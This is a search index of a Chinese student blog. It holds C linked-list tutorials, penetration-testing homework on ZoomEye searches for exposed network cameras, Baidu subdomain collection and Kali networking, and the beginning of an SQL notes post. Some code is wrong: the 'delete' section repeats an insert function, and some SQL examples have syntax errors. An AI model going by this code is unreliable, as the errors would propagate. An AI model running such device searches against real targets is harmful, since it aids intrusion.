<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>链表</title>
      <link href="/2023/12/08/%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/12/08/%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h1><h2 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">DataType data;   <span class="comment">//数据域 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span>   <span class="comment">//指针域 </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">PNode</span>;</span>  <span class="comment">//节点类型定义 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">LinkList</span>;</span>  <span class="comment">//单链表类型定义 </span></span><br></pre></td></tr></table></figure><h2 id="创建链表"><a href="#创建链表" class="headerlink" title="创建链表"></a>创建链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">SetNullList_Link</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    LinkList head = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span> (head != <span class="literal">NULL</span>) head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> head; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Head</span><span class="params">(<span class="keyword">struct</span> Node* head)</span>   <span class="comment">//用头插法创建单链表 </span></span><br><span class="line">&#123;</span><br><span class="line">PNode p=<span class="literal">NULL</span>;   <span class="comment">//临时使用 </span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; 头插法，请输入整形数据建立链表，以 -1 结束\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line"><span class="keyword">while</span>(data!=<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">p=(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node)); <span class="comment">//分配空间 </span></span><br><span class="line">p -&gt; data=data;  <span class="comment">//对数据域赋值 </span></span><br><span class="line">p -&gt;next = head -&gt;next;  <span class="comment">//对next域赋值 </span></span><br><span class="line">head -&gt; next =p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Tail</span><span class="params">(<span class="keyword">struct</span> Node* head)</span><span class="comment">//用尾插法建立链表 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">p</span>=</span><span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">q</span>=</span>head;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;尾插法， 请输入整形数据建立链表，以 -1 结束\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data); </span><br><span class="line"><span class="keyword">while</span>(data!=<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">p=(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//分配空间 </span></span><br><span class="line">p -&gt; data=data;<span class="comment">//数据域赋值 </span></span><br><span class="line">p -&gt;next =<span class="literal">NULL</span>;<span class="comment">//指针域赋值 </span></span><br><span class="line">q -&gt;next =p;</span><br><span class="line">q=p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="输出链表"><a href="#输出链表" class="headerlink" title="输出链表"></a>输出链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(LinkList head)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode p=head -&gt; next;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,p -&gt; data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="插入算法"><a href="#插入算法" class="headerlink" title="插入算法"></a><strong>插入算法</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中 llist是操作的链表，x是待插入元素y的前驱节点元素，y是待插入的元素</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPost_link</span><span class="params">(LinkList llist,DataType x,DataType y)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p =llist;</span><br><span class="line">    PNode Newp=(PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    Newp -&gt; data=y;</span><br><span class="line">    Newp -&gt; next =<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (p -&gt; data==x)</span><br><span class="line">        &#123;</span><br><span class="line">            Newp -&gt; next=p -&gt; next;</span><br><span class="line">            p -&gt;next =Newp;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            p=p -&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;not exist data %d\n&quot;</span>,x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除算法"><a href="#删除算法" class="headerlink" title="删除算法"></a>删除算法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DelNode_Link</span><span class="params">(LinkList head,<span class="type">int</span> deldata)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(head==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">PNode prees=head;</span><br><span class="line">PNode current=head -&gt; next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="keyword">if</span>(current -&gt; data == deldata)</span><br><span class="line">&#123;</span><br><span class="line">prees -&gt; next = current -&gt; next;</span><br><span class="line"><span class="built_in">free</span>(current);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">prees=current;</span><br><span class="line">current=current -&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;not exist %d\n&quot;</span>,deldata);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将尾结点连接到头结点</span></span><br><span class="line"></span><br><span class="line">PNode <span class="title function_">buildCircularLinkedList</span><span class="params">(<span class="type">int</span> n, PNode tail)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode current=<span class="literal">NULL</span>, prev;</span><br><span class="line">    prev = tail; </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        current = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;current-&gt;data);</span><br><span class="line">        prev-&gt;next = current;</span><br><span class="line">        prev = current;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next = tail-&gt;next;</span><br><span class="line">    tail-&gt;next = current;</span><br><span class="line">    <span class="keyword">return</span> tail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h1><h2 id="类型定义-1"><a href="#类型定义-1" class="headerlink" title="类型定义"></a>类型定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pre</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">LinkList</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">PNode</span>;</span></span><br></pre></td></tr></table></figure><h2 id="创建链表-1"><a href="#创建链表-1" class="headerlink" title="创建链表"></a>创建链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">SetList_Link</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">LinkList head=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">head-&gt;data=<span class="number">0</span>;</span><br><span class="line">head-&gt;pre=<span class="literal">NULL</span>;</span><br><span class="line">head-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="头插法-1"><a href="#头插法-1" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">HeadInsert</span><span class="params">(LinkList head,<span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">   newNode-&gt;data = data;</span><br><span class="line">   newNode-&gt;pre = head;</span><br><span class="line">   newNode-&gt;next = head-&gt;next;</span><br><span class="line">   <span class="keyword">if</span>(head-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      head-&gt;next-&gt;pre = newNode;</span><br><span class="line">   &#125;</span><br><span class="line">   head-&gt;next = newNode;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="尾插法-1"><a href="#尾插法-1" class="headerlink" title="尾插法"></a>尾插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">TailInsert</span><span class="params">(LinkList head, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PNode p = head;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;pre = p;</span><br><span class="line">    p-&gt;next = newNode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="输出链表-1"><a href="#输出链表-1" class="headerlink" title="输出链表"></a>输出链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(LinkList head)</span></span><br><span class="line">&#123;</span><br><span class="line">LinkList PrintList=head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(PrintList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-&gt;&quot;</span>,PrintList-&gt;data);</span><br><span class="line">PrintList=PrintList-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">TailInsert</span><span class="params">(LinkList head, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PNode p = head;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;pre = p;</span><br><span class="line">    p-&gt;next = newNode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="插入算法-1"><a href="#插入算法-1" class="headerlink" title="插入算法"></a>插入算法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertAfterElement</span><span class="params">(LinkList head, <span class="type">int</span> target, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;data == target) &#123;</span><br><span class="line">            PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line"></span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                p-&gt;next-&gt;pre = newNode;</span><br><span class="line">            &#125;</span><br><span class="line">            newNode-&gt;pre = p;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line"></span><br><span class="line">            head-&gt;data++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target element not found\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作业No2</title>
      <link href="/2023/12/06/%E4%BD%9C%E4%B8%9A2/"/>
      <url>/2023/12/06/%E4%BD%9C%E4%B8%9A2/</url>
      
        <content type="html"><![CDATA[<h1 id="题目汇总"><a href="#题目汇总" class="headerlink" title="题目汇总"></a>题目汇总</h1><p>1.与ZoomEye功能类似的搜索引擎还有哪些？</p><p>2.利用ZoomEye进行相关搜索，截图，发布到自己的Blog。</p><p>3.子域名收集，截图。</p><h1 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h1><p>与ZoomEye功能类似的搜索引擎还有哪些？</p><p> 回答： 除了ZoomEye之外，还有一些功能类似的搜索引擎，包括：</p><ol><li><p>Shodan：Shodan是一个面向物联网设备的搜索引擎，可以搜索全球范围内连接到互联网的设备，包括路由器、摄像头、服务器等等。用户可以使用Shodan搜索设备，发现漏洞，探查设备安全性等。</p></li><li><p>BinaryEdge：BinaryEdge是一款面向企业的安全分析工具，提供网络情报、风险评估、漏洞扫描等功能。与ZoomEye类似，BinaryEdge可以搜索Internet上所有的设备和服务，并对其进行评估和分类。</p></li><li><p>Censys：Censys是一个面向互联网设备和服务的搜索引擎，可以帮助用户发现全球范围内的漏洞和威胁。它可以搜索IPv4和IPv6地址、证书、域名、协议等信息。</p></li><li><p>Fofa Pro：Fofa Pro是一款面向企业的网络安全搜索引擎，可以搜索包括IP地址、域名、子域名、端口、关键词等信息。它可以帮助用户发现互联网上的资产和漏洞，评估企业的安全风险。</p></li></ol><h1 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h1><p>利用ZoomEye进行相关搜索，截图，发布到自己的Blog</p><p>回答：搜索  领势 Compact Wireless-G 网络视频摄像机 http服务器</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A2.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2023-12-06113341.png"></p><h1 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h1><p>子域名收集，截图。</p><p>回答：搜索 <a href="https://www.baidu.com/">百度</a> 的子域名</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A2.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2023-12-06113825.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作业No1</title>
      <link href="/2023/12/05/%E4%BD%9C%E4%B8%9A1/"/>
      <url>/2023/12/05/%E4%BD%9C%E4%B8%9A1/</url>
      
        <content type="html"><![CDATA[<h1 id="题目汇总"><a href="#题目汇总" class="headerlink" title="题目汇总"></a>题目汇总</h1><p>1、Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？<br>2、Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？<br>3、对于1、2的结果，进行总结分析。<br>注：网络配置发生变化，建议重启网卡（操作命令见PPT）<br>作业发布到自己blog备查。</p><h1 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h1><p>Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05134440.png"></p><p>回答：不能</p><h1 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h1><p>Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05134748.png"></p><p>回答：能</p><h1 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h1><p>对于1、2的结果，进行总结分析。</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05135040.png"></p><p>回答：Guet-WiFi会给物理机分配ip，不会给虚拟机分配ip</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2023/11/20/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/11/20/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL操作"><a href="#MySQL操作" class="headerlink" title="MySQL操作"></a>MySQL操作</h1><h2 id="登陆："><a href="#登陆：" class="headerlink" title="登陆："></a>登陆：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u [用户名] <span class="operator">-</span>p</span><br></pre></td></tr></table></figure><h2 id="查询用户名所有数据库："><a href="#查询用户名所有数据库：" class="headerlink" title="查询用户名所有数据库："></a>查询用户名所有数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure><h2 id="创建数据库："><a href="#创建数据库：" class="headerlink" title="创建数据库："></a>创建数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database [数据库名]；</span><br></pre></td></tr></table></figure><h2 id="删除数据库："><a href="#删除数据库：" class="headerlink" title="删除数据库："></a>删除数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> database [数据库名] ;</span><br></pre></td></tr></table></figure><h2 id="使用数据库："><a href="#使用数据库：" class="headerlink" title="使用数据库："></a>使用数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use [数据库名];</span><br></pre></td></tr></table></figure><h2 id="查询数据库中的表："><a href="#查询数据库中的表：" class="headerlink" title="查询数据库中的表："></a>查询数据库中的表：</h2><p>show tables;</p><h2 id="创建表："><a href="#创建表：" class="headerlink" title="创建表："></a>创建表：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [表名]</span><br><span class="line"></span><br><span class="line">(</span><br><span class="line"></span><br><span class="line">id <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="更改数据表名："><a href="#更改数据表名：" class="headerlink" title="更改数据表名："></a>更改数据表名：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> [原数据表名] <span class="keyword">to</span> [新数据表名]</span><br></pre></td></tr></table></figure><h2 id="向数据表中插入数据："><a href="#向数据表中插入数据：" class="headerlink" title="向数据表中插入数据："></a>向数据表中插入数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> [数据表名]  (id ,name,age) <span class="keyword">values</span> (<span class="number">1</span>,&quot;tom&quot; <span class="number">19</span>);</span><br></pre></td></tr></table></figure><h2 id="向数据表中擦插入新的列："><a href="#向数据表中擦插入新的列：" class="headerlink" title="向数据表中擦插入新的列："></a>向数据表中擦插入新的列：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [数据表名] [列名] [列的数据类型]；</span><br></pre></td></tr></table></figure><h2 id="更改数据表中的数据："><a href="#更改数据表中的数据：" class="headerlink" title="更改数据表中的数据："></a>更改数据表中的数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> [数据表名] <span class="keyword">set</span> name<span class="operator">=</span>&quot;lisa&quot; <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span 